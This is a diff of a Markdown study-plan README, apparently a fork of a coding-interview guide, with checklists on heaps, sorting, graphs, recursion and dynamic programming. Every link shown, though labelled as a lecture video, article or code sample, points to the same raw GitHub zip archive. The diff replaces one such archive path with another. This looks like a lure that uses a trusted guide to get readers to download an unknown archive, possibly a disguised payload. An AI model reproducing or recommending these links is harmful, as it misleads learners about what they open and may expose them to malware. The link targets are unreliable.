+    - [ ] [Introduction (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Naive Implementations (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Binary Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Tree Height Remark (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Basic Operations (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Complete Binary Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Pseudocode (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Heap Sort - jumps to start (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Heap Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Building a heap (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [MIT: Heaps and Heap Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CS 61B Lecture 24: Priority Queues (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Linear Time BuildHeap (max-heap)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Implement a max-heap:
         - [ ] insert
         - [ ] sift_up - needed for insert
@@ -842,51 +842,51 @@ if you can identify the runtime complexity of different algorithms. It's a super
     - Implement sorts & know best case/worst case, average complexity of each:
         - no bubble sort - it's terrible - O(n^2), except when n <= 16
     - [ ] Stability in sorting algorithms ("Is Quicksort stable?")
-        - [Sorting Algorithm Stability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Stability In Sorting Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Stability In Sorting Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Sorting Algorithms - Stability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Sorting Algorithm Stability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Stability In Sorting Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Stability In Sorting Algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Sorting Algorithms - Stability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - [ ] Which algorithms can be used on linked lists? Which on arrays? Which on both?
         - I wouldn't recommend sorting a linked list, but merge sort is doable.
-        - [Merge Sort For Linked List](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Merge Sort For Linked List](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - For heapsort, see Heap data structure above. Heap sort is great, but not stable
 
-- [ ] [Sedgewick - Mergesort (5 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [1. Mergesort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [2. Bottom up Mergesort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [3. Sorting Complexity](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [4. Comparators](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [5. Stability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [ ] [Sedgewick - Mergesort (5 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [1. Mergesort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [2. Bottom up Mergesort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [3. Sorting Complexity](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [4. Comparators](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [5. Stability](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [ ] [Sedgewick - Quicksort (4 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [1. Quicksort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [2. Selection](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [3. Duplicate Keys](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [4. System Sorts](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [ ] [Sedgewick - Quicksort (4 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [1. Quicksort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [2. Selection](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [3. Duplicate Keys](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [4. System Sorts](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - [ ] UC Berkeley:
-    - [ ] [CS 61B Lecture 29: Sorting I (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CS 61B Lecture 30: Sorting II (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CS 61B Lecture 32: Sorting III (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CS 61B Lecture 33: Sorting V (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [CS 61B Lecture 29: Sorting I (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CS 61B Lecture 30: Sorting II (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CS 61B Lecture 32: Sorting III (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CS 61B Lecture 33: Sorting V (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-- [ ] [Bubble Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Analyzing Bubble Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Insertion Sort, Merge Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Insertion Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Merge Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Quicksort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-- [ ] [Selection Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+- [ ] [Bubble Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Analyzing Bubble Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Insertion Sort, Merge Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Insertion Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Merge Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Quicksort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+- [ ] [Selection Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - [ ] Merge sort code:
-    - [ ] [Using output array (C)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Using output array (Python)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [In-place (C++)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Using output array (C)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Using output array (Python)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [In-place (C++)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 - [ ] Quick sort code:
-    - [ ] [Implementation (C)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Implementation (C)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Implementation (Python)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Implementation (C)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Implementation (C)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Implementation (Python)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - [ ] Implement:
     - [ ] Mergesort: O(n log n) average and worst case
@@ -895,20 +895,20 @@ if you can identify the runtime complexity of different algorithms. It's a super
     - For heapsort, see Heap data structure above
 
 - [ ] Not required, but I recommended them:
-    - [ ] [Sedgewick - Radix Sorts (6 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [1. Strings in Java](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [2. Key Indexed Counting](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [3. Least Significant Digit First String Radix Sort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [4. Most Significant Digit First String Radix Sort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [5. 3 Way Radix Quicksort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [6. Suffix Arrays](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Radix Sort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Radix Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Radix Sort, Counting Sort (linear time given constraints) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Randomization: Matrix Multiply, Quicksort, Freivalds' algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Sorting in Linear Time (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Sedgewick - Radix Sorts (6 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [1. Strings in Java](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [2. Key Indexed Counting](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [3. Least Significant Digit First String Radix Sort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [4. Most Significant Digit First String Radix Sort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [5. 3 Way Radix Quicksort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [6. Suffix Arrays](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Radix Sort](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Radix Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Radix Sort, Counting Sort (linear time given constraints) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Randomization: Matrix Multiply, Quicksort, Freivalds' algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Sorting in Linear Time (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
-As a summary, here is a visual representation of [15 sorting algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip).
+As a summary, here is a visual representation of [15 sorting algorithms](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip).
 If you need more detail on this subject, see "Sorting" section in [Additional Detail on Some Subjects](#additional-detail-on-some-subjects)
 
 ## Graphs
@@ -926,34 +926,34 @@ Graphs can be used to represent many problems in computer science, so this secti
     - When asked a question, look for a graph-based solution first, then move on if none
 
 - [ ] MIT(videos):
-    - [ ] [Breadth-First Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Depth-First Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Breadth-First Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Depth-First Search](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - [ ] Skiena Lectures - great intro:
-    - [ ] [CSE373 2012 - Lecture 11 - Graph Data Structures (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CSE373 2012 - Lecture 12 - Breadth-First Search (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CSE373 2012 - Lecture 13 - Graph Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CSE373 2012 - Lecture 14 - Graph Algorithms (con't) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CSE373 2012 - Lecture 15 - Graph Algorithms (con't 2) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [CSE373 2012 - Lecture 16 - Graph Algorithms (con't 3) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [CSE373 2012 - Lecture 11 - Graph Data Structures (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CSE373 2012 - Lecture 12 - Breadth-First Search (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CSE373 2012 - Lecture 13 - Graph Algorithms (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CSE373 2012 - Lecture 14 - Graph Algorithms (con't) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CSE373 2012 - Lecture 15 - Graph Algorithms (con't 2) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [CSE373 2012 - Lecture 16 - Graph Algorithms (con't 3) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - [ ] Graphs (review and more):
 
-    - [ ] [6.006 Single-Source Shortest Paths Problem (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [6.006 Dijkstra (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [6.006 Bellman-Ford (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [6.006 Speeding Up Dijkstra (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Aduni: Graph Algorithms I - Topological Sorting, Minimum Spanning Trees, Prim's Algorithm -  Lecture 6 (video)]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Aduni: Graph Algorithms II - DFS, BFS, Kruskal's Algorithm, Union Find Data Structure - Lecture 7 (video)]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Aduni: Graph Algorithms III: Shortest Path - Lecture 8 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Aduni: Graph Alg. IV: Intro to geometric algorithms - Lecture 9 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] ~~[CS 61B 2014 (starting at 58:09) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)~~
-    - [ ] [CS 61B 2014: Weighted graphs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Greedy Algorithms: Minimum Spanning Tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ ] [Strongly Connected Components Kosaraju's Algorithm Graph Algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [6.006 Single-Source Shortest Paths Problem (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [6.006 Dijkstra (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [6.006 Bellman-Ford (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [6.006 Speeding Up Dijkstra (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Aduni: Graph Algorithms I - Topological Sorting, Minimum Spanning Trees, Prim's Algorithm -  Lecture 6 (video)]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Aduni: Graph Algorithms II - DFS, BFS, Kruskal's Algorithm, Union Find Data Structure - Lecture 7 (video)]( https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Aduni: Graph Algorithms III: Shortest Path - Lecture 8 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Aduni: Graph Alg. IV: Intro to geometric algorithms - Lecture 9 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] ~~[CS 61B 2014 (starting at 58:09) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)~~
+    - [ ] [CS 61B 2014: Weighted graphs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Greedy Algorithms: Minimum Spanning Tree (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ ] [Strongly Connected Components Kosaraju's Algorithm Graph Algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - Full Coursera Course:
-    - [ ] [Algorithms on Graphs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [ ] [Algorithms on Graphs (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - I'll implement:
     - [ ] DFS with adjacency list (recursive)
@@ -975,14 +975,14 @@ Graphs can be used to represent many problems in computer science, so this secti
 
 - ### Recursion
     - [ ] Stanford lectures on recursion & backtracking:
-        - [ ] [Lecture 8 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Lecture 9 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Lecture 10 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Lecture 11 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Lecture 8 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Lecture 9 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Lecture 10 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Lecture 11 | Programming Abstractions (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
     - When it is appropriate to use it?
     - How is tail recursion better than not?
-        - [ ] [What Is Tail Recursion Why Is It So Bad?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Tail Recursion (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [What Is Tail Recursion Why Is It So Bad?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Tail Recursion (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Dynamic Programming
     - You probably won't see any dynamic programming problems in your interview, but it's worth being able to recognize a 
@@ -991,28 +991,28 @@ Graphs can be used to represent many problems in computer science, so this secti
     - I suggest looking at many examples of DP problems until you have a solid understanding of the pattern involved.
     - [ ] Videos:
         - the Skiena videos can be hard to follow since he sometimes uses the whiteboard, which is too small to see
-        - [ ] [Skiena: CSE373 2012 - Lecture 19 - Introduction to Dynamic Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Skiena: CSE373 2012 - Lecture 20 - Edit Distance (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Skiena: CSE373 2012 - Lecture 21 - Dynamic Programming Examples (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Skiena: CSE373 2012 - Lecture 22 - Applications of Dynamic Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Simonson: Dynamic Programming 0 (starts at 59:18) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Simonson: Dynamic Programming I - Lecture 11 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [ ] [Simonson: Dynamic programming II - Lecture 12 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [ ] [Skiena: CSE373 2012 - Lecture 19 - Introduction to Dynamic Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Skiena: CSE373 2012 - Lecture 20 - Edit Distance (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Skiena: CSE373 2012 - Lecture 21 - Dynamic Programming Examples (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Skiena: CSE373 2012 - Lecture 22 - Applications of Dynamic Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Simonson: Dynamic Programming 0 (starts at 59:18) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Simonson: Dynamic Programming I - Lecture 11 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [ ] [Simonson: Dynamic programming II - Lecture 12 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - [ ] List of individual DP problems (each is short):
-            [Dynamic Programming (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
